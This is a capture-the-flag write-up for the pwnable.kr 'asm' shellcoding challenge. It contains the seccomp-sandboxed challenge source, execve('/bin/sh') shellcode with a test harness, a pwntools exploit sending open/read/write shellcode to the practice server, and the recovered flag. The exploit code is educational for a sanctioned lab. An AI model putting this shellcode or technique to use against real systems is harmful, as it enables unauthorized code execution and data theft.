# ASM
Let's write some shell code!
## Source Code
```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
	if (ctx == NULL) {
		printf("seccomp error\n");
		exit(0);
	}

	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

	if (seccomp_load(ctx) < 0){
		seccomp_release(ctx);
		printf("seccomp error\n");
		exit(0);
	}
	seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	printf("Welcome to shellcoding practice challenge.\n");
	printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
	printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
	printf("If this does not challenge you. you should play 'asg' challenge :)\n");

	char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
	memset(sh, 0x90, 0x1000);
	memcpy(sh, stub, strlen(stub));
	
	int offset = sizeof(stub);
	printf("give me your x64 shellcode: ");
	read(0, sh+offset, 1000);

	alarm(10);
	chroot("/home/asm_pwn");	// you are in chroot jail. so you can't use symlink in /tmp
	sandbox();
	((void (*)(void))sh)();
	return 0;
}
```
Looks like the program is asking for `shellcode` to run!


## What is shellcode
`shellcode` is a small piece of code, typically written in assembly or machine language, that is used as a payload in exploits to gain control of or execute commands on a target system.
`shellcode` is mostly assembly instructions that attacker is injecting into a program to execute malicious code!
For example, the `assembly` for:
```C
execve("/bin/sh");
```
is:
```asm
    /* execve(path='/bin/sh', argv=0, envp=0) */
    /* push b'/bin/sh\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x68732f6e69622f
    xor [rsp], rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
```
**NOTICE**
you can generate assembly and `shellcode` for specific functions using python and `pwntools`:
```python
from pwn import *
# set the context
context(arch='amd64', os='linux')
# get the assembly
code = shellcraft.execve("/bin/sh")
# compile it
raw = asm(code)
# convert it to C escaped string
print(''.join(f'\\x{byte:02x}' for byte in raw))
```
There you have it! `shellcode` for executing `/bin/sh`.
After generating the `shellcode` you can check it like this:
```C
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

// Shellcode as a C string
unsigned char shellcode[] = "\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05";

int main() {
    printf("Shellcode length: %zu\n", strlen(shellcode));

    // Get system page size
    int page_size = sysconf(_SC_PAGESIZE);
    void *shellcode_address = (void *)((unsigned long)shellcode & ~(page_size - 1));

    // Set the memory containing the shellcode to be executable
    if (mprotect(shellcode_address, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
        perror("mprotect");
        return -1;
    }

    // Create a function pointer to the shellcode
    void (*shell)() = (void(*)())shellcode;

    // Execute the shellcode
    shell();

    return 0;
}
```
Compile and run the program:
```bash
gcc -o test test.c -z execstack -fno-stack-protector -no-pie
./test
```
The program should start and run `/bin/sh`.
**NOTICE** - you must make the stack executable! this is why we use `mprotect` and all those flags with `gcc`!
Let's get back to the challenge.

## Exploit
When you run the program it says you can insert 64 bit shell code, that using `open`,`read` and `write` `syscalls` to read the flag.
you can read about those syscalls [here](https://filippo.io/linux-syscall-table/)

Let's generate the code!
```python
from pwn import *
import sys

context(arch='amd64', os='linux')

file_name = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'
length = 50

shellcode = asm(
	shellcraft.open(file_name) +
	shellcraft.read('rax', 'rsp', length) +
	shellcraft.write(1, 'rsp', length) +
	shellcraft.exit(0)
)

p = remote('pwnable.kr', 9026)
p.recvline()
p.sendline(shellcode)
p.recv()
print(p.recvline().decode())
```
run it and:
```sh
python3 exploit.py
```
And we got the flag!
```
Mak1ng_shelLcodE_i5_veRy_eaSy
```
Good Game!